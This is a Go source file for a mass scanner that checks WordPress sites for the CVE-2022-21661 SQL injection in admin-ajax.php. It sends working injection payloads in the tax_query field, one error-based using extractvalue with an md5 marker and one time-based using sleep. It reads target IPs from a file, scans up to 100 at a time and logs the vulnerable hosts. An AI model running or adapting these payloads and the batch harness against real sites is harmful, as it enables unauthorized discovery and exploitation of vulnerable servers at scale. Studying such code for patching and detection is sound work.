package main

import (
	"bufio"
	"crypto/md5"
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

var stamp bool

var absPath string

type WordPress struct {
}

func init() {
	files, _ := os.Executable()
	path, _ := filepath.Split(files)
	absPath = path + time.Now().Format("20060102150405") + ".log"
}

func (w *WordPress) r0(ip string, client *req.Client) (bool, error) {

	resp, err := client.R().Get("http://" + ip + "/wp-admin/admin-ajax.php")
	if err != nil {
		return false, err
	}
	if resp.StatusCode == 400 && strings.Contains(resp.String(), "0") {
		return true, nil
	}
	return false, nil
}

func (w *WordPress) r1(ip string, client *req.Client) (bool, error) {
	randNum := w.randInt()
	payload := `action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(` + randNum + `),0x5e))#"]}}}`
	resp, err := w.payload(ip, payload, client)
	if err != nil {
		return false, err
	}

	if resp.StatusCode == 200 && strings.Contains(resp.String(), w.md5b16(randNum)) {
		return true, err
	}
	return false, nil
}

func (w *WordPress) r2(ip string, client *req.Client) (bool, error) {
	payload := `action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(1))#"]}}}`
	resp, err := w.payload(ip, payload, client)
	if err != nil {
		return false, err
	}

	if resp.StatusCode == 200 && resp.TotalTime() > time.Second {
		return true, nil
	}
	return false, nil
}

func (w *WordPress) payload(ip, payload string, client *req.Client) (*req.Response, error) {
	resp, err := client.R().SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36").
		SetBody(payload).
		Post("http://" + ip + "/wp-admin/admin-ajax.php")
	if err != nil {
		return nil, err
	}
	return resp, nil

}

func (w *WordPress) singleScan(ip string) {
	if stamp {
		defer wg.Done()
	}
	client := req.C()
	r0, err := w.r0(ip, client)
	if err != nil {
		color.FgRed.Printf("[ERROR]:%v\n", err)
		return
	}

	if r0 {
		r1, err := w.r1(ip, client)
		if err != nil {
			color.FgRed.Printf("[ERROR]:%v\n", err)
			return
		}
		if r1 {
			color.FgGreen.Printf("[INFO]:[%s] WordPress CVE-2022-21661 Existent\n", ip)
			w.scanLogs(ip)
		} else {
			r2, err := w.r2(ip, client)
			if err != nil {
				color.FgRed.Printf("[ERROR]:%v\n", err)
				return
			}
			if r2 {
				color.FgGreen.Printf("[INFO]:[%s] WordPress CVE-2022-21661 Existent\n", ip)
				w.scanLogs(ip)
			} else {
				color.FgGray.Printf("[INFO]:[%s] WordPress CVE-2022-21661 Non-existent\n", ip)
			}
		}
	} else {
		color.FgGray.Printf("[INFO]:[%s] WordPress CVE-2022-21661 Non-existent\n", ip)
	}

}

func (w *WordPress) batchScan(path string) {
	stamp = true
	begin := time.Now()
	color.FgGray.Println("[INFO]:Scan...")

	f, err := os.Open(path)
	if err != nil {
		color.FgRed.Printf("[ERROR]:%v\n", err)
		return
	}
	defer f.Close()

	r := bufio.NewReader(f)
	
	//thread limit
	limitChan := make(chan struct{}, 100)
	
	for {
		limitChan <- struct{}{}
		ip, err := r.ReadString('\n')
		ip = strings.TrimSpace(ip)
		if err != nil && err != io.EOF {
			color.FgRed.Printf("[ERROR]:%v\n", err)
			return
		}
		if ip != "" {
			wg.Add(1)
			go func(ip string) {
				w.singleScan(ip)
				 
				<-limitChan
			}(ip)
		}
		if err == io.EOF {
			break
		}

	}
	wg.Wait()
	timeDif := time.Now().Sub(begin)
	color.FgGray.Println("[INFO]:Take", timeDif)
}

func (w *WordPress) randInt() string {
	rand.Seed(time.Now().UnixNano())
	r1 := rand.Intn(100000)
	r2 := rand.Intn(100000)
	sum := r1 + r2
	return strconv.Itoa(sum)
}

func (w *WordPress) md5b16(randNum string) string {
	md5b32 := md5.Sum([]byte(randNum))
	md5b16 := fmt.Sprintf("%x", md5b32)
	return md5b16[8:24]
}

func (w *WordPress) scanLogs(ip string) {
	f, err := os.OpenFile(absPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()

	f.WriteString(fmt.Sprintf("[%s] [INFO]:[%s] WordPress CVE-2022-21661 Existent\n", time.Now().Format("2006-01-02 15:04:05"), ip))
}
